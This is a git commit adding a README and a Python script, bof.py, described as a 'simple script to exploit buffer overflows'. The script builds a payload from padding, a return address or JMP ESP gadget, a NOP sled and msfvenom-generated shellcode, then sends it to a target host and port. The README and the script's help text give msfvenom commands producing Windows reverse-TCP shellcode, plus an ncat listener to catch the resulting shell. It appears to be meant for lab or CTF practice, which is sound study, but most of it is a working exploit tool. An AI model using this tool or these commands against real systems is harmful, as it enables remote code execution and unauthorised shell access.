c0d120c91fba7629224dc86d3e0d8a2a34c91f90
sudoaza <555365+sudoaza@users.noreply.github.com>
2022-04-19 21:32:59 +0200

    initial commit

--- README.md
+++ README.md
@@ -1,2 +1,51 @@
 # bof
+
 Simple script to exploit buffer overdlows
+
+## Usage
+
+usage: bof.py [-h] -H HOST -p PORT -o OFFSET [-e EIP] [-b BIN] [-s SIZE] [-sf SUFFIX] [-pf PREFIX] [-a ARCH] [-O OS]
+
+Exploit buffer overflows.
+
+Options:
+- -h, --help            show this help message and exit
+- -H HOST, --host HOST  Target host
+- -p PORT, --port PORT  Target port
+- -o OFFSET, --offset OFFSET EIP offset
+- -e EIP, --eip EIP     Value to overwrite EIP with or ROP chain. Ie. 0x01010101,0x02020202,0x03030303
+- -b BIN, --bin BIN     Target binary to extract gadgets from. Only ELF!!
+- -s SIZE, --size SIZE  Payload size
+- -sf SUFFIX, --suffix SUFFIX  Payload suffix, Ie. USER
+- -pf PREFIX, --prefix PREFIX Payload prefix, Ie. \n
+- -a ARCH, --arch ARCH  Target architecture. Ie. x86 or amd64
+- -O OS, --os OS        Target OS. Ie. windows or linux
+- -v, --debug           Show debug information
+
+
+Create custom shellcode and save to shellcode.py
+(must be formatted buf = b'\x90\x90\x90\x90...')
+
+    msfvenom -p windows/shell_reverse_tcp ... -f python -a x86 > shellcode.py
+
+Listen for shell
+
+    ncat -lvp 4444
+
+
+Run by passing the return address to overwrite EIP
+
+    ./bof.py -H 10.10.76.237 -p 31337 --sf $'\n' -o 146 -e '0x080414c3'
+
+
+Run by passing a binary and search for a JPM ESP ROP automatically
+
+
+    ./bof.py -H 10.10.76.237 -p 31337 --sf $'\n' -o 146 -b ./vuln
+
+## Install
+
+    git clone git@github.com:sudoaza/bof.git
+    cd bof
+    pip install -r requirements.txt
+
---
+++ bof.py
@@ -0,0 +1,107 @@
+#!/usr/bin/env python3
+
+import argparse
+from math import ceil
+from pwn import *
+from elftools.common.exceptions import ELFError
+
+parser = argparse.ArgumentParser(
+  formatter_class=argparse.RawDescriptionHelpFormatter,
+  description="""Exploit buffer overflows.""", 
+  epilog="""
+Create custom shellcode and save to shellcode.py
+(must be formatted buf = b'\\x90\\x90\\x90\\x90...')
+
+  $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f python -a x86 -b "\\x00\\x09\\x0a\\x0d\\xff" > shellcode.py
+
+Listen for shell
+
+  $ ncat -lvp 4444
+
+Run exploit
+
+  $ ./exploit.py -H 10.10.76.237 -p 31337 --sf $'\\n' -o 146 -e '0x080414c3'
+""")
+parser.add_argument('-H','--host', help='Target host', required=True)
+parser.add_argument('-p','--port', help='Target port', required=True)
+parser.add_argument('-o','--offset', help='EIP offset', required=True, type=int)
+
+parser.add_argument('-e','--eip', help='Value to overwrite EIP with or ROP chain. Ie. 0x01010101,0x02020202,0x03030303')
+parser.add_argument('-b','--bin', help='Target binary to extract gadgets from. Only ELF!!')
+
+parser.add_argument('-s','--size', help='Payload size', default=-1, type=int)
+parser.add_argument('-sf','--suffix', help='Payload suffix, Ie. USER ', default='')
+parser.add_argument('-pf','--prefix', help="Payload prefix, Ie. \\n", default='')
+parser.add_argument('-a','--arch', help='Target architecture. Ie. x86 or amd64', default='x86')
+parser.add_argument('-O','--os', help='Target OS. Ie. windows or linux', default='windows')
+parser.add_argument('-v','--debug', help='Show debug information', action="store_true")
+
+args = parser.parse_args()
+
+# Save msfvenom output formated as python to shellcode.py in curent dir
+# msfvenom -p windows/shell/reverse_tcp LHOST=10.18.97.196 LPORT=4444 \
+# -f python -a x86 -b "\x00\x09\x0a\x0d\xff" > shellcode.py
+try:
+  from shellcode import buf as shellcode
+except ModuleNotFoundError as e:
+  parser.error("""Shellcode not present. Create it at shellcode.py
+  
+  msfvenom -p windows/shell/reverse_tcp ... -f python -a x86 > shellcode.py
+  """)
+
+if ( not args.eip and not args.bin ):
+  parser.error('Either -e/--eip or -b/--bin is required.')
+
+log_level = 'info'
+if (args.debug):
+  log_level = 'debug'
+
+context(log_level = log_level, arch= args.arch, os = args.os)
+
+elf = None
+binary = None
+if (args.bin):
+  try:
+    context.binary = binary = ELF(args.bin)
+  except ELFError as e:
+    parser.error('-b/--bin only supports ELF binaries.')
+
+  rop = ROP(binary)
+
+args.prefix = bytes(args.prefix, 'utf-8')
+args.suffix = bytes(args.suffix, 'utf-8')
+
+if (args.eip):
+  args.eip = b"".join( [ pack(int(addr, 16)) for addr in args.eip.split(',') ] )
+else:
+  args.eip = pack(rop.esp.address)
+
+if (args.offset < len(args.prefix)):
+  parser.error("-pf/--prefix length is bigger than -o/--offset, it would override EIP.")
+
+used_size = args.offset + len(args.eip) + len(shellcode) + len(args.suffix) 
+
+if (args.size == -1):
+  args.size = ceil( used_size / 100) * 100
+
+if (args.size < used_size):
+  parser.error( f"Increase -s/--size. Can't fit useful payload of size {used_size} into size {args.size}.")
+
+log.info(f"Shellcode size {len(shellcode)}")
+log.info(f"Useful size (offset + ROP + shellcode + suffix) {used_size}")
+
+padding = b"\x90" * (args.offset - len(args.prefix))
+nopsled = b"\x90" * (args.size - used_size)
+
+payload = padding + args.eip + nopsled + shellcode 
+payload = args.prefix + payload + args.suffix
+
+log.info(f"Payload size {len(payload)}")
+
+c = remote(args.host, args.port)
+
+log.info("Sending payload")
+c.send(payload)
+c.settimeout(3)
+log.info("Listening for response")
+c.recv(1024)
